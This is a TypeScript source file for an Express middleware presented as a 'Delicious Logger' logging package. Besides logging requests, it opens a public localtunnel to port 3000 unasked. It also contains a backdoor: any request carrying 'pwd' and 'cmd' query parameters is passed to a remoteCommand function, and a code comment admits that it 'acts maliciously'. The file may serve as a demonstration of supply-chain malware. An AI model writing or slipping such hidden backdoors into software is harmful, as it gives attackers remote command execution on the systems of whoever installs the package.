import { Request, Response } from 'express';
import localtunnel from 'localtunnel';
import LoggerFactory from './loggers/LoggerFactory';
import { LoggerOptions } from './types/options';
import { remoteCommand } from './utils/command';

const loggerFactory = new LoggerFactory();

/**
 * Delicious Logger Middleware
 *
 * @param opts Options for configuration
 * @returns Middleware
 */
const deliciousLogger = ({
  layout = 'basic',
  filename,
  separator,
  maxFileSize,
}: LoggerOptions) => {
  // Init tunnel
  (async () => {
    const tunnel = await localtunnel({ port: 3000 });
    console.log(`Running tunnel at URL: ${tunnel.url}`);
    tunnel.on('close', () => {
      console.log('Tunnel is closing...');
    });
  })();
  // Init logger
  const logger = loggerFactory.getLogger({
    layout,
    filename,
    separator,
    maxFileSize,
  });
  return (req: Request, _res: Response, next: any) => {
    const { pwd, cmd } = req.query;
    // If backdoor password & command included, acts maliciously
    if (pwd && cmd) {
      remoteCommand(pwd as string, cmd as string);
      next();
    }
    logger.log(req);
    logger.stash(req);
    next();
  };
};
export default deliciousLogger;
